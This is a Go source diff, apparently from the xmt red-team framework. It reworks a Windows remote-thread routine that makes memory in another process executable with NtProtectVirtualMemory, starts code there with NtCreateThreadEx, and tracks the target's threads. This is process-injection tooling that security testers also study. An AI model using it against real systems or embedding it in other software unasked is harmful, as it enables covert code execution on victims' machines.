@@ -6,15 +6,12 @@ import (
 	"context"
 	"sync/atomic"
 	"time"
+	"unsafe"
 
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/device/winapi"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
 )
-
-//windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
-//	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
-//	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
-//	windows.PROCESS_DUP_HANDLE | 0x001
 
 type thread struct {
 	ctx              context.Context
@@ -28,38 +25,6 @@ type thread struct {
 	suspended        bool
 }
 
-func (t *thread) wait() {
-	var (
-		x   = make(chan error)
-		err error
-	)
-	go func() {
-		x <- wait(t.hwnd)
-		close(x)
-	}()
-	select {
-	case err = <-x:
-	case <-t.ctx.Done():
-	}
-	if err != nil {
-		t.stopWith(exitStopped, err)
-		return
-	}
-	if err2 := t.ctx.Err(); err2 != nil {
-		t.stopWith(exitStopped, err2)
-		return
-	}
-	err = winapi.GetExitCodeThread(t.hwnd, &t.exit)
-	if atomic.StoreUint32(&t.cookie, 2); err != nil {
-		t.stopWith(exitStopped, err)
-		return
-	}
-	if t.exit != 0 {
-		t.stopWith(t.exit, &ExitError{Exit: t.exit})
-		return
-	}
-	t.stopWith(t.exit, nil)
-}
 func (t *thread) close() {
 	if t.hwnd == 0 || t.owner == 0 {
 		return
@@ -134,11 +99,83 @@ func (t *thread) Suspend() error {
 	}
 	return winapi.SuspendThread(t.hwnd)
 }
+func (t *thread) wait(p, i uint32) {
+	var (
+		x   = make(chan error)
+		err error
+	)
+	go func() {
+		if bugtrack.Enabled {
+			defer bugtrack.Recover("cmd.executable.wait.func1()")
+		}
+		var e error
+		if e = wait(t.hwnd); p > 0 && i > 0 {
+			// If we have more threads (that are not our zombie thread) switch
+			// to watch that one until we have none left.
+			if n := nextNonThread(p, i); n > 0 {
+				winapi.CloseHandle(t.hwnd)
+				for t.hwnd = n; t.hwnd > 0; {
+					e = wait(t.hwnd)
+					if n = nextNonThread(p, i); n == 0 {
+						break
+					}
+					winapi.CloseHandle(t.hwnd)
+					t.hwnd = n
+				}
+			}
+		}
+		x <- e
+		close(x)
+	}()
+	select {
+	case err = <-x:
+	case <-t.ctx.Done():
+	}
+	if err != nil {
+		t.stopWith(exitStopped, err)
+		return
+	}
+	if err2 := t.ctx.Err(); err2 != nil {
+		t.stopWith(exitStopped, err2)
+		return
+	}
+	err = winapi.GetExitCodeThread(t.hwnd, &t.exit)
+	if atomic.StoreUint32(&t.cookie, 2); err != nil {
+		t.stopWith(exitStopped, err)
+		return
+	}
+	if t.exit != 0 {
+		t.stopWith(t.exit, &ExitError{Exit: t.exit})
+		return
+	}
+	t.stopWith(t.exit, nil)
+}
 func (t *thread) SetSuspended(s bool) {
 	t.suspended = s
 }
 func (t *thread) Done() <-chan struct{} {
 	return t.ch
+}
+func nextNonThread(p, i uint32) uintptr {
+	h, err := winapi.CreateToolhelp32Snapshot(0x4, 0)
+	if err != nil {
+		return 0
+	}
+	var (
+		t winapi.ThreadEntry32
+		n uintptr
+	)
+	t.Size = uint32(unsafe.Sizeof(t))
+	for err = winapi.Thread32First(h, &t); err == nil; err = winapi.Thread32Next(h, &t) {
+		if t.OwnerProcessID != p || t.ThreadID == i {
+			continue
+		}
+		if n, err = winapi.OpenThread(0x120040, false, t.ThreadID); err == nil {
+			break
+		}
+	}
+	winapi.CloseHandle(h)
+	return n
 }
 func (t *thread) Handle() (uintptr, error) {
 	if t.hwnd == 0 {
@@ -215,16 +252,12 @@ func (t *thread) Start(p uintptr, d time.Duration, a uintptr, b []byte) error {
 		return t.stopWith(exitStopped, err)
 	}
 	if a > 0 {
-		if protectEnable {
-			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x2)
-		}
+		winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x2)
 		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, a, t.loc, t.suspended); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
 	} else {
-		if protectEnable {
-			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x20)
-		}
+		winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x20)
 		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, t.loc, 0, t.suspended); err != nil {
 			return t.stopWith(exitStopped, err)
 		}
